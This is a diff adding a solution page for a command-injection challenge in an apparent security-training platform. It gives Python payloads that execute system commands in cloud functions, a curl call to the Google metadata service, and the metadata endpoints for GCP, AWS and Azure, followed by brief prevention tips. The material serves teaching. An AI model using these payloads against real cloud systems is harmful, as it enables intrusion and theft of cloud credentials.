@@ -1,0 +1,114 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection in Cloud Functions - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection in Cloud Functions</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit command injection vulnerabilities in a cloud function deployment platform.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in a Google Cloud Functions deployment platform. The system processes user-provided function code and deploys it to the cloud, but lacks proper code analysis and sandboxing.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Analyze function structure:</strong> Understand the expected Python function format.</p>
+                    </li>
+                    <li>
+                        <p><strong>Inject system calls:</strong> Add system calls to the function code.</p>
+                        <pre class="bg-light p-3 rounded"><code>import os
+def hello_world(request):
+    os.system('whoami')
+    return 'Hello World'</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Use subprocess module:</strong> Try alternative command execution methods.</p>
+                        <pre class="bg-light p-3 rounded"><code>import subprocess
+def hello_world(request):
+    result = subprocess.run(['id'], capture_output=True, text=True)
+    return result.stdout</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Access cloud metadata:</strong> Try to access cloud environment information.</p>
+                        <pre class="bg-light p-3 rounded"><code>import os
+def hello_world(request):
+    os.system('curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name')
+    return 'Function executed'</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Cloud Function Payloads</h3>
+                <ul>
+                    <li><code>import os; os.system('whoami')</code> - Direct system call</li>
+                    <li><code>import subprocess; subprocess.run(['id'])</code> - Subprocess execution</li>
+                    <li><code>__import__('os').system('hostname')</code> - Dynamic import</li>
+                    <li><code>exec('import os; os.system("uname -a")')</code> - Dynamic execution</li>
+                </ul>
+
+                <h3 class="mt-4">Cloud Environment Context</h3>
+                <p>Cloud function vulnerabilities can lead to:</p>
+                <ul>
+                    <li>Access to cloud service APIs</li>
+                    <li>Data exfiltration from cloud storage</li>
+                    <li>Lateral movement within cloud infrastructure</li>
+                    <li>Privilege escalation in cloud environments</li>
+                </ul>
+
+                <h3 class="mt-4">Cloud Platforms</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Major Providers:</h6>
+                        <ul>
+                            <li>Google Cloud Functions</li>
+                            <li>AWS Lambda</li>
+                            <li>Azure Functions</li>
+                            <li>Vercel Functions</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Runtime Environments:</h6>
+                        <ul>
+                            <li>Python 3.9+</li>
+                            <li>Node.js</li>
+                            <li>Go</li>
+                            <li>Java</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Cloud Metadata Access</h3>
+                <p>Try accessing cloud metadata services:</p>
+                <ul>
+                    <li><strong>Google Cloud:</strong> <code>http://metadata.google.internal/</code></li>
+                    <li><strong>AWS:</strong> <code>http://169.254.169.254/latest/meta-data/</code></li>
+                    <li><strong>Azure:</strong> <code>http://169.254.169.254/metadata/instance</code></li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Code Analysis:</strong> Analyze function code for dangerous patterns</li>
+                    <li><strong>Runtime Restrictions:</strong> Implement runtime security controls</li>
+                    <li><strong>Environment Isolation:</strong> Isolate function execution environments</li>
+                    <li><strong>Input Validation:</strong> Validate all function inputs and configurations</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level21') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
